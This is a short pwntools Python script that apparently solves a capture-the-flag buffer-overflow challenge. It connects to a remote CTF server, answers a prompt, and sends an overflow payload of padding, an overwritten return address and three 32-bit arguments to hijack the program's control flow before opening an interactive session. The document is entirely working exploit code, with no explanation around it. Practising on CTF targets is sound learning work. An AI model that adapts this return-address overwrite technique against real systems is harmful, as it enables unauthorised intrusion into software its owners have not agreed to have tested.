from pwn import *

# p = process('./bof')
p = remote("ctf.umbccd.io", 4000)
# input("attach")

p.recvuntil('your name?')

payload = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbb'#ccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz111122223333444455556666777788889999'
payload += p32(0x08049182)
payload += p32(0x00)
payload += p32(0x4b0)
payload += p32(0x16e)

p.sendline('dish')

p.recvuntil('be singing?')

p.sendline(payload)

p.interactive()